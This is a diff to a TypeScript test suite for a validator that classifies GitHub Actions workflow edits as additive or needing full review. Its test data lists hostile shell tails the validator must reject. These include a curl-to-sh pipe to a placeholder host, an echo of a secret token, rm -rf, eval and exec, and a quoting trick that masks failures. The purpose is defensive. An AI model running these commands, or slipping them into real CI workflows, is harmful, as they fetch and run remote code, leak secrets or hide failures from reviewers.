@@ -51,60 +51,170 @@ const LINT_APPENDED = CI.replace(
   `lint_command: npm run lint && (npm run tidy:check || echo "::warning title=tidy::tidy check failed")\n`,
 );
 
-test("workflow: given a guarded `&& <command>` appended to a with: input or a run: string, then the edit is additive and names it", () => {
-  expect(workflowEdit(CI, LINT_APPENDED)).toEqual({
-    additive: true,
-    detail: "jobs.lint.with.lint_command appended",
-  });
+const GRAMMAR_CI = `name: CI
+on:
+  push:
+    branches: [main]
+permissions:
+  contents: read
+jobs:
+  lint:
+    uses: acme/workflows/.github/workflows/node.yml@v3
+    with:
+      lint_command: npm run lint
+      run_tests: 'true'
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: codecov/codecov-action@v4
+        with:
+          fail_ci_if_error: "true"
+          command: npm test
+      - name: Test
+        run: |-
+          npm ci
+          npm test
+      - run: npm run e2e \\
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - run: npm run build
+`;
+const edit = (from: string, to: string) => {
+  const after = GRAMMAR_CI.replace(from, () => to);
+  if (after === GRAMMAR_CI) throw new Error(`fixture has no ${from}`);
+  return workflowEdit(GRAMMAR_CI, after);
+};
+const OUTSIDE = '(outside plain words and "double-quoted text")';
+const FORM = 'more than && <command> or && (<command> || echo "<text>")';
+const build = "jobs.build.steps[0].run";
+
+test("workflow: the allowed forms of an appended command are additive", () => {
   expect(
-    workflowEdit(CI, CI.replace("- run: npm run build", "- run: npm run build && npm run size")),
-  ).toEqual({ additive: true, detail: "jobs.build.steps[0].run appended" });
-  // A comment alone stays code: it can steer a tool.
-  expect(workflowEdit(CI, `# the CI\n${CI}`)).toEqual({
-    additive: false,
-    detail: "changes only comments or layout, read as code",
-  });
+    edit(
+      "lint_command: npm run lint\n",
+      `lint_command: npm run lint && (npm run tidy:check || echo "::warning title=tidy::tidy check failed")\n`,
+    ),
+  ).toEqual({ additive: true, detail: "jobs.lint.with.lint_command appended" });
+  for (const tail of [
+    " && npm run size",
+    " && npm run a && npm run b",
+    " && (npm run x || true)",
+    " && (npm run x)",
+    " && npx --yes @acme/tidy@2.3.1 check --max-warnings=0 src/,test/",
+    ' && ./scripts/check.sh "a b" c',
+  ])
+    expect(edit("- run: npm run build", `- run: npm run build${tail}`)).toEqual({
+      additive: true,
+      detail: `${build} appended`,
+    });
+  // The last line of a `|-` block grows the same way.
+  expect(edit("          npm test\n", "          npm test && npm run e2e\n").additive).toBe(true);
 });
 
-test("workflow: given an appended text that can hide a failure, a new line or a new input, then the edit stays full", () => {
-  const appended = (from: string, to: string) => workflowEdit(CI, CI.replace(from, to)).detail;
-  const lint = "jobs.lint.with.lint_command";
-  const build = "jobs.build.steps[0].run";
-  // The review's probes.
-  expect(appended("npm run lint\n", "npm run lint || true\n")).toBe(
-    `appends a command not chained with a leading && to ${lint}`,
-  );
-  expect(appended("- run: npm run build", "- run: npm run build || true")).toBe(
-    `appends a command not chained with a leading && to ${build}`,
-  );
-  expect(
-    appended("- run: npm run build", "- run: npm run build; curl -s https://x.example | sh"),
-  ).toBe(`appends a command not chained with a leading && to ${build}`);
+test("workflow: an appended text outside the allowed form stays full, whatever its quoting", () => {
   for (const [tail, why] of [
-    [" && npm run x || true", "a || outside a group, which can hide a failure"],
-    [" && npm run x; true", "a ; that can run past a failure"],
-    [" && curl -s https://x.example | sh", "a | that can run past a failure"],
-    [" && npm run x &", "a & that can run past a failure"],
-    [" && exit 0", "exit, set +e, trap or a command substitution"],
-    [" && set +e", "exit, set +e, trap or a command substitution"],
-    [" && trap '' ERR", "exit, set +e, trap or a command substitution"],
-    [" && echo $(id)", "exit, set +e, trap or a command substitution"],
-    [" && echo `id`", "exit, set +e, trap or a command substitution"],
-    [" && (npm run x || true", "an unclosed quote or group"],
+    // The recheck's payload (verdict mwnshd5b): bash reads $'\'' as one quote, so || true ran.
+    [" && echo $'\\'' || true #'", `the character $ ${OUTSIDE}`],
+    [' && echo $"a" || true', `the character $ ${OUTSIDE}`],
+    [" && echo 'a' || true", `the character ' ${OUTSIDE}`],
+    [" && npm run x || true", FORM],
+    [" && (npm run x || true) || true", FORM],
+    [" && (npm run x || rm -rf .)", FORM],
+    [" && (npm run x || exit 0)", FORM],
+    [" && ((npm run x) || true)", FORM],
+    [" && (npm run x || true", FORM],
+    [" && PATH=/tmp/x npm run x", FORM],
+    [' && "exit" 0', FORM],
+    [" && npm run x; true", `the character ; ${OUTSIDE}`],
+    [" && curl -s https://x.example | sh", `the character | ${OUTSIDE}`],
+    [" && npm run x &", `the character & ${OUTSIDE}`],
+    [" && echo x >> $GITHUB_ENV", `the character > ${OUTSIDE}`],
+    [" && cat <(false || true)", `the character < ${OUTSIDE}`],
+    [" && { npm run x || true; }", `the character { ${OUTSIDE}`],
+    [" && echo $(id)", `the character $ ${OUTSIDE}`],
+    [" && echo `id`", `the character \` ${OUTSIDE}`],
+    [" && echo \\", `the character \\ ${OUTSIDE}`],
+    [' && ex"it" 0', `the character " ${OUTSIDE}`],
+    [' && echo "cost $HOME"', 'a "quoted text" left open or holding $, a backtick or a backslash'],
+    [
+      ' && echo "a\\"" || true "',
+      'a "quoted text" left open or holding $, a backtick or a backslash',
+    ],
+    [" && exit 0", "the shell command exit"],
+    [" && set +e", "the shell command set"],
+    [" && EXIT 0", "the shell command EXIT"],
+    [" && eval npm run x", "the shell command eval"],
+    [" && exec true", "the shell command exec"],
+    [" && source ./x.sh", "the shell command source"],
+    [" && . ./x.sh", "the shell command ."],
+    [" && command exit 0", "the shell command command"],
+    [" && time exit 0", "the shell command time"],
     [" && echo ${{ secrets.NPM_TOKEN }}", "an expression"],
+    [" || true", "a command not chained with a leading &&"],
+    ["; curl -s https://x.example | sh", "a command not chained with a leading &&"],
   ] as const)
-    expect(appended("- run: npm run build", `- run: npm run build${tail}`)).toBe(
+    expect([tail, edit("- run: npm run build", `- run: npm run build${tail}`).detail]).toEqual([
+      tail,
       `appends ${why} to ${build}`,
-    );
-  // A new line in a run: block is a new command, not an append to the last one.
-  expect(appended("npm test\n", "npm test\n          npm run e2e\n")).toBe(
-    "appends a new line to jobs.test.steps[1].run",
+    ]);
+  // In a block scalar a # is the shell's comment, not YAML's (the recheck's payload ends in one).
+  expect(edit("          npm test\n", "          npm test && npm run x # note\n").detail).toBe(
+    `appends the character # ${OUTSIDE} to jobs.test.steps[1].run`,
   );
-  // Only an existing input may grow; a new one is a change.
   expect(
-    appended("lint_command: npm run lint\n", "lint_command: npm run lint\n      node: '22'\n"),
-  ).toBe("adds the input jobs.lint.with.node");
+    edit("          npm test\n", "          npm test && echo $'\\'' || true #'\n").detail,
+  ).toBe(`appends the character $ ${OUTSIDE} to jobs.test.steps[1].run`);
+  // `cmd \` + `&& x`: the shell reads `\&` as a literal and `& x` as a background job.
+  expect(edit("npm run e2e \\\n", "npm run e2e \\&& npm run x\n").detail).toBe(
+    "appends a command after a trailing backslash to jobs.test.steps[2].run",
+  );
 });
+
+test("workflow: only a reusable workflow's command input may grow", () => {
+  // An input that is no command turns into another value (`'true'` no longer reads true).
+  expect(edit("run_tests: 'true'", "run_tests: 'true && npm run x'").detail).toBe(
+    "changes jobs.lint.with.run_tests",
+  );
+  // An action's input is not known to be a shell command.
+  expect(edit('fail_ci_if_error: "true"', 'fail_ci_if_error: "true && npm run x"').detail).toBe(
+    "changes jobs.test.steps[0].with.fail_ci_if_error",
+  );
+  expect(edit("command: npm test\n", "command: npm test && npm run x\n").detail).toBe(
+    "changes jobs.test.steps[0].with.command",
+  );
+});
+
+// The allowed tails, run by bash -e as GitHub runs a `run:` step: a failure before them still fails.
+const GREEN_TAILS = [
+  ' && (npm run tidy:check || echo "::warning title=tidy::tidy check failed")',
+  " && npm run size",
+  " && npm run a && npm run b",
+  " && (npm run x || true)",
+  " && (npm run x)",
+  " && npx --yes @acme/tidy@2.3.1 check --max-warnings=0 src/,test/",
+  ' && ./scripts/check.sh "a b" c',
+];
+
+test.skipIf(process.platform === "win32")(
+  "workflow: given a failing command, when an allowed tail is appended and bash -e runs it, then the step still fails",
+  () => {
+    for (const tail of GREEN_TAILS) {
+      expect(
+        workflowEdit(
+          GRAMMAR_CI,
+          GRAMMAR_CI.replace("- run: npm run build", () => `- run: npm run build${tail}`),
+        ).additive,
+      ).toBe(true);
+      const run = spawnSync("bash", ["-e", "-c", `false${tail}`], {
+        encoding: "utf8",
+        timeout: 10_000,
+        env: { PATH: process.env.PATH ?? "" },
+      });
+      expect([tail, run.status === 0]).toEqual([tail, false]);
+    }
+  },
+);
 
 test("workflow: given a guarded key, a removal, a replaced string or an unreadable file, then the edit stays full naming why", () => {
   const refused = (after: string) => workflowEdit(CI, after);
@@ -414,7 +524,13 @@ test("lane: without a dependency bump an additive workflow edit is focused, neve
   const refused = {
     workflow: { additive: false, detail: "changes permissions: (permissions.contents)" },
   };
-  expect(computeLane({ files: [file(".github/workflows/ci.yml", 1, refused)] }).lane).toBe("full");
+  // The full lane's reason names why the workflow sub-rule refused the edit.
+  expect(computeLane({ files: [file(".github/workflows/ci.yml", 1, refused)] })).toMatchObject({
+    lane: "full",
+    reasons: [
+      "touches a risk path: .github/workflows/ci.yml (changes permissions: (permissions.contents))",
+    ],
+  });
   expect(computeLane({ files: [file(".github/workflows/ci.yml", 1)] }).lane).toBe("full");
   expect(
     computeLane({
@@ -559,5 +675,8 @@ test("from git: the #891 diff (two pins, a new script, lockfile, changelog line,
   expect(branchLane(root, { base: "main", head: widened })).toMatchObject({
     lane: "full",
     riskFiles: [".github/workflows/ci.yml"],
+    reasons: [
+      "touches a risk path: .github/workflows/ci.yml (changes permissions: (permissions.contents))",
+    ],
   });
 });
